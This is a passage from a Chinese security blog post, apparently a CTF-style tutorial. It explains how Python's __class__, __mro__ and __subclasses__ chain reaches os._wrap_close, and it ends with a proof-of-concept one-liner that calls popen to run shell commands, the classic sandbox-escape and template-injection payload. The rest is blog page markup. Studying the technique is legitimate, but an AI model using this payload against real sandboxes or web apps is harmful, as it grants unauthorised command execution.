<p><code>print(&quot;&quot;.__class__.__mro__)</code><br>得到结果：<code>&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;</code> 即先解析str类，再解析object类。</p>
<p>4.<code>__subclasses__()</code> 返回一个类的子类</p>
<p><code>print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</code></p>
<p>得到结果<code>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;.....(还有很多就不全部列举了)</code></p>
<p>在这些子类中，我们可以找到一个有趣的模块–os。而os模块中有调用系统shell的方法，我们可以据此执行命令。</p>
<p>可以利用如下代码找到与os有关的子类的位置</p>
<p><code>a = &#39;&#39;.__class__.__bases__[0].__subclasses__()
for index, value in enumerate(a):
    value = str(value)  # 返回的为type类型。需要转化为数值型才能迭代
    if &#39;os.&#39; in value:
        print(index)
        print(value)</code></p>
<p>得到结果<br><code>133&lt;class &#39;os._wrap_close&#39;&gt;134&lt;class &#39;os._AddedDllDirectory&#39;&gt;</code></p>
<p>在os._wrap_close中，有我们喜闻乐见的函数–popen&#40;&#41;</p>
<p>最后的poc:</p>
<p><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;cmd&#39;).read())</code></p>
<p>其中<code>__init</code>用于初始化类。<code>__globals__</code>全局来查找所有的方法及变量及参数。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2020
        <i class="ri-heart-fill heart_icon"></i> Y0un9
      </li>
    </ul>
    <ul>
      <li>
        
        
        
        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
        <span class="division">|</span>
        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Y0un9"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="https://github.com/Y0un9c" target="_blank" rel="noopener">GitHub</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Subtitle -->

<script>
  try {
    var typed = new Typed("#subtitle", {
      strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
      startDelay: 0,
      typeSpeed: 200,
      loop: true,
      backSpeed: 100,
      showCursor: true
    });
  } catch (err) {
    console.log(err)
  }
</script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom -->

<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>



    
  </div>
</body>

</html>